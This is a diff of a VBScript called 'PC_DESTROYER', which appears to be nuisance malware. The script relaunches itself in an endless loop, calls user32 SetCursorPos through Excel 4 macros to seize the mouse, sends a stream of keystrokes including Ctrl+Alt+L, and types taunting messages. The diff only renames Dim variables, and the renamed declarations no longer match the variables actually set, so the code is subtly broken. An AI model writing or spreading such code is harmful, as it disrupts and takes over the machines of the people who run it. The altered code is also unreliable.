@@ -2,7 +2,7 @@
  CreateObject("WScript.Shell").Run WScript.ScriptFullName
  auto.sendkeys "UR PC IS FUCKED BY PC_DESTROYER"
  do
-    Dim Excel1: Set Excel1 = WScript.CreateObject("Excel.Application") 
+    Dim Excel: Set Excel1 = WScript.CreateObject("Excel.Application") 
 Excel1.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""0"",""0"")"
     auto.sendkeys "{enter}"
     auto.sendkeys "^%l"
@@ -16,7 +16,7 @@ Excel1.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""0"",""0"")
     auto.sendkeys "dsgsdfs"
     auto.sendkeys "{UP}"
         auto.sendkeys "{enter}"
-  Dim Excel3: Set Excel3 = WScript.CreateObject("Excel.Application") 
+  Dim Excel: Set Excel3 = WScript.CreateObject("Excel.Application") 
 Excel3.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""1500"",""1500"")"
     auto.sendkeys "HAHAHAH"
         auto.sendkeys "{enter}"
@@ -37,6 +37,6 @@ auto.sendkeys "{DOWN}"
         auto.sendkeys "{enter}"
     auto.sendkeys "{LEFT}"
 auto.sendkeys "{DOWN}"
-  Dim Excel3: Set Excel3 = WScript.CreateObject("Excel.Application") 
+  Dim Excel: Set Excel3 = WScript.CreateObject("Excel.Application") 
 Excel3.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""5000"",""5000"")"
 loop
